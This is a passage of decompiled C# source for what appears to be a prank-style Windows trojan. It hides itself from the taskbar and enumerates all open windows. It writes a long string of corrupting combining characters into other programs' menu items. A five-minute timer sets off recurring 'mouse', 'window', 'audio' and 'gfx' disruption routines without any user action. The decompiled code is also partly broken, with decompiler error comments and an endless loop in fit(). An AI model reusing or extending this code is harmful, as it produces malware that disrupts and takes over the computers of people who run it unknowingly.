0348\u0353.\u034a\u0351\u0343\u034a\u036c\u0367\u0342\u0313\u0343\u0367\u030a\u033e\u0312\u033d\u036d\u036a\u0336\u035a\u0323\u032b\u031f\u0356\u0317\u0355\u0356\u0345\u034e\u033c\u032e\u0330\u0332\u0316\u034d\u0356\u033b\u0345.\u034a\u0311\u0301\u0365\u0315\u0361\u035f\u0362\u0328\u0326\u0317\u0316\u0331\u034e\u033a\u034e\u0325\u032c\u032f\u033a\u035a\u032a.\u0367\u0307\u0312\u034c\u0342\u036a\u030a\u0357\u0313\u0314\u035e\u0324\u0317\u0317\u032f\u034e\u0329\u0323\u0319\u032b\u0356\u033a.\u0313\u030b\u0305\u0303\u0346\u030f\u036c\u033d\u035e\u0489\u0340\u034f\u0325\u033a\u035a\u0329\u031c\u0348\u0331\u0320.\u036a\u036c\u0302\u036e\u0311\u0351\u0309\u0342\u030d\u030b\u0351\u0309\u0334\u0327\u0316\u0354\u032e\u031d\u0349\u033a\u0332\u0324\u032c\u0339\u034d\u032d\u0319\u0330.\u0343\u0308\u0303\u0364\u034b\u030c\u0309\u0357\u0327\u0358\u0360\u0341\u0327\u0330\u0316\u0345\u031d\u0333\u0356\u0331\u0325\u0348\u0333.\u0350\u0301\u0307\u035b\u0351\u0366\u036b\u0314\u0306\u0313\u0369\u030c\u0336\u0321\u0328\u0330\u032e\u031d\u0320\u0323\u032e\u0317\u032c\u033a\u0349\u0318\u033b\u033c\u033b\u0331\u031e\u0353\u032a.\u035b\u036e\u0314\u031a\u0328\u0328\u032f\u031f\u0354\u0339\u033a\u031d\u0331\u0316\u0329\u031c\u0339\u032e.\u0307\u0310\u0363\u033d\u0303\u0369\u034f\u031b\u0362\u0332\u0347\u031f\u032c\u032a\u0339\u032f\u0331\u0317.\u0357\u034c\u035b\u0367\u033d\u0311\u036e\u0364\u0310\u0322\u035d\u0362\u0325\u031c\u031d\u033c\u031c\u034e\u032a\u0326\u032f\u034e\u0323\u0345\u0325\u032d\u0348\u0347\u0326\u0347.\u0344\u0357\u036a\u033f\u030a\u036f\u0314\u034a\u0357\u0363\u0350\u0309\u0310\u0350\u034b\u036e\u0334\u0327\u035c\u0336\u0360\u0359\u032e\u031e\u0317\u0345\u0356\u032b\u0355\u0320\u034d\u0320\u0356\u0316\u031c\u0349\u031c.\u0350\u035b\u0357\u0313\u034a\u0365\u0307\u031a\u0344\u036a\u030b\u033f\u0346\u030f\u0366\u0306\u0312\u0344\u0307\u0337\u0489\u031b\u035d\u0361\u032c\u0332\u0348\u0325\u0347\u0349\u0349\u0319\u0353\u0316\u032c\u031e\u033c\u032a\u034d\u0330\u0317.\u0309\u0300\u0310\u036c\u0308\u036d\u0305\u0489\u035c\u033c\u0323\u032b\u031c\u032b\u031d\u032f\u0347\u0349\u0330\u031f\u032b\u0353\u0329\u0319\u0348.\u0307\u033f\u0365\u035b\u0352\u036c\u034a\u0313\u036b\u036b\u035b\u0328\u0360\u034f\u033a\u0325\u035a\u033b\u032a\u033a\u032e\u033a\u0345\u0325\u031c\u031c\u0349\u0325\u0348\u034d.\u0300\u033d\u033d\u0357\u0352\u0346\u030a\u035b\u033f\u0301\u0308\u0343\u0311\u0300\u036c\u030e\u0362\u0338\u0333\u0326\u035a\u031c\u0318\u032c\u031c\u034e\u032f\u0320\u0324\u0329.\u0309\u034a\u033f\u0309\u0344\u031a\u0369\u0350\u0343\u0340\u0322\u0353\u035a\u0316\u0326\u0355.\u034a\u036a\u036c\u031a\u0312\u030b\u0310\u034a\u0363\u031a\u036a\u034a\u0311\u030e\u0365\u036d\u0357\u035c\u035d\u0340\u0337\u0326\u0355\u0355\u0347\u031d\u032e\u0347\u0317\u0349\u031c\u0329.\u034a\u0309\u0309\u0304\u036d\u030a\u0365\u0305\u034a\u0309\u0363\u0307\u0310\u0327\u034f\u0348\u0349\u0355\u0333\u0353\u031c\u0354\u0316\u0347\u034d\u032e.\u030d\u0303\u033e\u030e\u0309\u030f\u0322\u0321\u0338\u0489\u031b\u0320\u032b\u031e\u0316\u0326", lpmii.cch);
				byte[] array = new byte[Encoding.UTF8.GetByteCount(text) + 1];
				Encoding.UTF8.GetBytes(text, 0, text.Length, array, 0);
				Marshal.Copy(array, 0, lpmii.dwTypeData, array.Length);
				SetMenuItemInfo(hMenu, num, fByPosition: true, ref lpmii);
			}
			finally
			{
				Marshal.FreeHGlobal(lpmii.dwTypeData);
			}
		}
	}

	private string fit(string v, uint cch)
	{
		if (v.Length == cch)
		{
			return v;
		}
		if (v.Length <= cch)
		{
			string text = "";
			while (true)
			{
				text += v;
				cch -= (uint)v.Length;
			}
		}
		return v.Substring(0, (int)cch);
	}

	public void slowTimer()
	{
		timer2.set_Interval(30000);
		timer3.set_Interval(30000);
	}

	[DllImport("coredll", SetLastError = true)]
	private static extern bool SetMenuItemInfo(IntPtr hMenu, uint uItem, [MarshalAs(UnmanagedType.Bool)] bool fByPosition, ref MENUITEMINFO lpmii);

	[DllImport("coredll", SetLastError = true)]
	private static extern bool GetMenuItemInfo(IntPtr hMenu, uint uItem, [MarshalAs(UnmanagedType.Bool)] bool fByPosition, out MENUITEMINFO lpmii);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

	public static IntPtr MakeLParam(int wLow, int wHigh)
	{
		return (IntPtr)(((short)wHigh << 16) | (wLow & 0xFFFF));
	}

	[DllImport("User32.dll")]
	private static extern IntPtr GetDC(IntPtr hwnd);

	[DllImport("User32.dll")]
	private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

	private void Form1_Load(object sender, EventArgs e)
	{
		Application.DoEvents();
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		if (direct)
		{
			((Form)this).Close();
			return;
		}
		timer2.Start();
		timer3.Stop();
		timer2_Tick(null, new EventArgs());
		Application.DoEvents();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnumWindows(EnumedWindow lpEnumFunc, ArrayList lParam);

	public static ArrayList GetWindows()
	{
		ArrayList arrayList = new ArrayList();
		EnumWindows(GetWindowHandle, arrayList);
		return arrayList;
	}

	private static bool GetWindowHandle(IntPtr windowHandle, ArrayList windowHandles)
	{
		windowHandles.Add(windowHandle);
		return true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		components = new Container();
		button1 = new Button();
		timer1 = new Timer(components);
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		button10 = new Button();
		button11 = new Button();
		button12 = new Button();
		button13 = new Button();
		button14 = new Button();
		button15 = new Button();
		timer2 = new Timer(components);
		timer3 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(12, 12));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(194, 68));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("mouse 1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		timer1.set_Enabled(true);
		timer1.set_Interval(30);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)button2).set_Location(new Point(12, 87));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(194, 68));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("mouse 2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Location(new Point(212, 12));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(194, 68));
		((Control)button3).set_TabIndex(2);
		((Control)button3).set_Text("window 1");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button4).set_Location(new Point(212, 87));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(194, 68));
		((Control)button4).set_TabIndex(3);
		((Control)button4).set_Text("window 2");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button5).set_Location(new Point(412, 12));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(194, 68));
		((Control)button5).set_TabIndex(4);
		((Control)button5).set_Text("audio 1");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button6).set_Location(new Point(412, 87));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(194, 68));
		((Control)button6).set_TabIndex(5);
		((Control)button6).set_Text("audio 2");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button7).set_Location(new Point(412, 162));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(194, 68));
		((Control)button7).set_TabIndex(6);
		((Control)button7).set_Text("audio 3");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)button8).set_Location(new Point(411, 234));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(194, 68));
		((Control)button8).set_TabIndex(7);
		((Control)button8).set_Text("audio 4");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button9).set_Location(new Point(12, 162));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(194, 68));
		((Control)button9).set_TabIndex(8);
		((Control)button9).set_Text("gfx 1 ");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((Control)button10).set_Location(new Point(12, 234));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(194, 68));
		((Control)button10).set_TabIndex(9);
		((Control)button10).set_Text("gfx 2");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)button11).set_Location(new Point(12, 310));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(194, 68));
		((Control)button11).set_TabIndex(10);
		((Control)button11).set_Text("gfx 3");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button11).add_Click((EventHandler)button11_Click);
		((Control)button12).set_Location(new Point(212, 310));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(194, 68));
		((Control)button12).set_TabIndex(11);
		((Control)button12).set_Text("video");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((Control)button13).set_Location(new Point(212, 161));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(194, 68));
		((Control)button13).set_TabIndex(12);
		((Control)button13).set_Text("window 3");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button13).add_Click((EventHandler)button13_Click);
		((Control)button14).set_Location(new Point(212, 234));
		((Control)button14).set_Name("button14");
		((Control)button14).set_Size(new Size(194, 68));
		((Control)button14).set_TabIndex(13);
		((Control)button14).set_Text("window 4");
		((ButtonBase)button14).set_UseVisualStyleBackColor(true);
		((Control)button14).add_Click((EventHandler)button14_Click);
		((Control)button15).set_Location(new Point(411, 310));
		((Control)button15).set_Name("button15");
		((Control)button15).set_Size(new Size(194, 68));
		((Control)button15).set_TabIndex(14);
		((Control)button15).set_Text("audio 5");
		((ButtonBase)button15).set_UseVisualStyleBackColor(true);
		((Control)button15).add_Click((EventHandler)button15_Click);
		timer2.set_Interval(60000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		timer3.set_Enabled(true);
		timer3.set_Interval(300000);
		timer3.add_Tick((EventHandler)timer3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(616, 396));
		((Control)this).get_Controls().Add((Control)(object)button15);
		((Control)this).get_Controls().Add((Control)(object)button14);
		((Control)this).get_Controls().Add((Control)(object)button13);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)button7);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
